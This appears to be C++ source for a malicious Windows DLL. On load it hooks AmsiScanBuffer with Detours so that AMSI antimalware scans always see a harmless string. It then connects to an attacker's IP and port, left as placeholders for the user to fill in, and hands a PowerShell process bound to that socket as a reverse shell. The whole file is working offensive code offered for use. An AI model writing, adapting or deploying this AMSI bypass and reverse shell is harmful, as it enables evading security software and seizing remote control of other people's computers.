#include <Windows.h>
#include <amsi.h>
#include <iostream>
#include <detours.h>
#include <cstdio>
#include <thread>
#include <WinSock2.h>
#include <winternl.h>
#include <TlHelp32.h>

#pragma comment(lib, "amsi.lib")
#pragma comment(lib, "ws2_32.lib")

#define SafeString "SafeString"

/* ---------- Reverse Shell Variables ----------- */

WSADATA wsaData;
SOCKET wsock;
struct sockaddr_in sock_addr;
int ret_val;
STARTUPINFO si;
PROCESS_INFORMATION pi;
char recvbuf[] = "";
char* ip;
short port;
int init_wsa_startup;
char* text;
int iResult;


static HRESULT(WINAPI* OriginalAmsiScanBuffer)(
    HAMSICONTEXT amsiContext,
    PVOID buffer,
    ULONG lenght,
    LPCWSTR contentName,
    HAMSISESSION amsiSession,
    AMSI_RESULT* result
    ) = AmsiScanBuffer;

__declspec(dllexport) HRESULT _AmsiScanBuffer_(
    HAMSICONTEXT amsiContext,
    PVOID buffer,
    ULONG lenght,
    LPCWSTR contentName,
    HAMSISESSION amsiSession,
    AMSI_RESULT* result
) {
    return OriginalAmsiScanBuffer(amsiContext, (PVOID)SafeString, (ULONG)sizeof(SafeString), contentName, amsiSession, result);
}

LPWSTR charToLPWSTR(const char* str) {
    int size = MultiByteToWideChar(CP_UTF8, 0, str, -1, nullptr, 0);
    LPWSTR wstr = new wchar_t[size];
    MultiByteToWideChar(CP_UTF8, 0, str, -1, wstr, size);
    return wstr;
}


BOOL APIENTRY DllMain( HMODULE hModule,
                       DWORD  ul_reason_for_call,
                       LPVOID lpReserved
                     )
{

    switch (ul_reason_for_call)
    {
    case DLL_PROCESS_ATTACH:
        
        AllocConsole();
        
        DetourRestoreAfterWith();
        
        DetourTransactionBegin();
        DetourUpdateThread(GetCurrentThread());
        DetourAttach(&(PVOID&)OriginalAmsiScanBuffer, _AmsiScanBuffer_);

        ip = (char*)"<YOUR_IP_ADDRESS>"; // REPLACE WITH YOUR IP ADDRESS 
        port = 0000; // TCP PORT YOU'RE LISTENING ON

        init_wsa_startup = WSAStartup(MAKEWORD(2, 2), &wsaData);
        wsock = WSASocket(AF_INET, SOCK_STREAM, IPPROTO_TCP, NULL, (unsigned int)NULL, (unsigned int)NULL);

        sock_addr.sin_family = AF_INET;
        sock_addr.sin_port = htons(port);
        sock_addr.sin_addr.s_addr = inet_addr(ip);

        WSAConnect(wsock, (SOCKADDR*)&sock_addr, sizeof(sock_addr), NULL, NULL, NULL, NULL);

        text = (char*)"[*] Shell established \n\n";
        ret_val = send(wsock, text, (int)strlen(text), 0);
        std::cout << ret_val << std::endl;

        memset(&si, 0, sizeof(si));
        si.cb = sizeof(si);
        si.dwFlags = STARTF_USESTDHANDLES;
        si.hStdInput = si.hStdOutput = si.hStdInput = si.hStdOutput = (HANDLE)wsock;

        CreateProcess(NULL, charToLPWSTR((const char*)"powershell.exe"), NULL, NULL, TRUE, 0, NULL, NULL, &si, &pi);

        DetourTransactionCommit();
        
        break;

    case DLL_PROCESS_DETACH:

        DetourTransactionBegin();
        
        DetourUpdateThread(GetCurrentThread);
        DetourDetach(&(PVOID&)OriginalAmsiScanBuffer, _AmsiScanBuffer_);        
        
        DetourTransactionCommit();
        
        FreeConsole();
        
        break;
    }
    return TRUE;
}
